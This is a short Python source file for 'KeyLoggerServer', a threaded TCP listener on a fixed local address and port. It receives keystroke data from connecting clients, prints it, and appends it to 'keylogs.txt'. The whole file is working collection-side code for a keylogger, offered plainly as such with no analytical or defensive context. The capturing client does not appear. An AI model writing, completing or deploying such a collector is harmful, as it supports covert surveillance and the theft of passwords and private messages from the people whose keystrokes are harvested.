import socket
import threading

class KeyLoggerServer:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.bind((self.host, self.port))
        self.clients = []

    def handle_client(self, client_socket, client_address):
        print(f"New connection from {client_address}")
        while True:
            try:
                data = client_socket.recv(1024).decode()
                if data:
                    print(f"Received from {client_address}: {data}")
                    self.save_logs(data)
                else:
                    break
            except ConnectionResetError:
                break
        client_socket.close()
        self.clients.remove(client_socket)
        print(f"Connection closed for {client_address}")

    def save_logs(self, logs):
        with open("keylogs.txt", "a") as file:
            file.write(logs)

    def start(self):
        self.server_socket.listen(5)
        print(f"Server listening on {self.host}:{self.port}")
        while True:
            client_socket, client_address = self.server_socket.accept()
            self.clients.append(client_socket)
            client_thread = threading.Thread(target=self.handle_client, args=(client_socket, client_address))
            client_thread.start()

if __name__ == "__main__":
    server = KeyLoggerServer(host="192.168.0.103", port=8888)
    server.start()